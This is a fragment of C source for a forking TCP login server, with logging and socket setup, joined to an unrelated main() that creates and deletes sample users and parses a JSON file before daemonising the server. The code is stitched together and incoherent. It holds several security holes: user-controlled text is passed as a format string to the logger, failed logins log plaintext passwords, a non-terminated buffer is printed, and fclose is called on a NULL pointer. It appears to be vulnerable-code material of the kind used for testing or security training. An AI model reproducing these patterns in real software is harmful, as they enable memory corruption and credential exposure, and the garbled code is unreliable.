	snprintf(buffer, sizeof(buffer)-1, "User attempting to authenticate: %s", user);
	logData(logfile, buffer);
	logData(logfile, "calling authenticate");
	ret = authenticate(logfile, user, pass);
	logData(logfile, "returned from authenticate");
	if (ret != 1)
	{
		if (ret == 2)
		{
			writeSock(sock, BADUSER, sizeof(BADUSER));	
		}	
		if (ret == 3)
		{
			writeSock(sock, BADPASS, sizeof(BADPASS));
		}
		snprintf(buffer, sizeof(buffer)-1,"user: %s failed to login with password %s", user, pass);
		logData(logfile, buffer);
		return;
	}
	logData(logfile, "user %s authenticated!", user);
	userFunctions(logfile, sock, user);
	return;
} 
void mainLoop(FILE *logf, int sock)
{
	int clientfd = 0;
	struct sockaddr_in client;
	socklen_t clientlen = 0;
	pid_t offspring = 0;
	memset((char *)&client, 0, sizeof(client));
	logData(logf, "entering main loop...");
	while (1)
	{
		clientfd = accept(sock, (struct sockaddr *)&client, &clientlen);
		if (clientfd == -1)
		{
			continue;
		}
		offspring = fork();
		if (offspring == -1)
		{
			continue;
		}
		if (offspring == 0)
		{
			handleConnection(logf, clientfd);
			close(clientfd);
			exit(0);
		}
		close(clientfd);
	}
}
void spawnhandler(int signumber)
{
	pid_t pid;
	int stat;
	while ((pid = waitpid(-1, &stat, WNOHANG))>0)
	{
		printf("circle of life completed for %i\n", pid);	
	}
}
int setupSock(FILE *logf, unsigned short port)
{
	int sock = 0;
	struct sockaddr_in sin;
	int opt = 0;
	if (signal(SIGCHLD, spawnhandler)== SIG_ERR)
	{
		perror("fork() spawn handler setup failed!");
		return -1;
	}
	memset((char *)&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
	{
		logData(logf, "socket() failed");
		return -1;
	}
	opt = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1)
	{
		logData(logf,"setsockopt() failed");
		return -1;
	}
	if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		logData(logf, "bind() failed");
		return -1;
	}
	if (listen(sock, 10) == -1)
	{
		logData(logf, "listen() failed");
		return -1;
	}
	return sock;
}
void logData(FILE *logfile, char *format, ...)
{
	char buffer[4096];
	va_list arguments;
	va_start(arguments, format);
	vsnprintf(buffer, sizeof(buffer)-1, format, arguments);
	va_end(arguments);
	fprintf(logfile, "LoggedData [Proccess:%i]: %s\n", getpid(), buffer);
	fflush(logfile);
}
int main(int argc, char** argv) {
    createUser("Alice", 1000.0);
    createUser("Bob", 500.0);
    createUser("Charlie", 750.0);
    createUser("David", 1200.0);
    createUser("Eve", 300.0);
    deleteUser("Alice");
    deleteUser("Charlie");
    processUserNode("Bob");
        char* filename;
        FILE *fp;
        struct stat filestatus;
        int file_size;
        char* file_contents;
        json_char* json;
        json_value* value;
        if (argc != 2) {
                fprintf(stderr, "%s <file_json>\n", argv[0]);
                return 1;
        }
        filename = argv[1];
        if ( stat(filename, &filestatus) != 0) {
                fprintf(stderr, "File %s not found\n", filename);
                return 1;
        }
        file_size = filestatus.st_size;
        file_contents = (char*)malloc(filestatus.st_size);
        if ( file_contents == NULL) {
                fprintf(stderr, "Memory error: unable to allocate %d bytes\n", file_size);
                return 1;
        }
        fp = fopen(filename, "rt");
        if (fp == NULL) {
                fprintf(stderr, "Unable to open %s\n", filename);
                fclose(fp);
                free(file_contents);
                return 1;
        }
        if ( fread(file_contents, file_size, 1, fp) != 1 ) {
                fprintf(stderr, "Unable t read content of %s\n", filename);
                fclose(fp);
                free(file_contents);
                return 1;
        }
        fclose(fp);
        printf("%s\n", file_contents);
        printf("--------------------------------\n\n");
        json = (json_char*)file_contents;
        value = json_parse(json,file_size);
        if (value == NULL) {
                fprintf(stderr, "Unable to parse data\n");
                free(file_contents);
                exit(1);
        }
        process_value(value, 0);
        json_value_free(value);
        free(file_contents);
        int sock;
        FILE *logf;
        logf = fopen("logfile.txt", "w"); 
        if (!logf)
        {
	perror("unable to open log file\n");
	exit(1);
         }
         daemon(0,0);
         sock = setupSock(logf, PORT);
         if (sock == -1)
         {
	logData(logf, "failed to setup socket, exiting");
	exit(1);
          }
               logData(logf, "intial socket setup complete");
               mainLoop(logf, sock);	
               exit(0);
}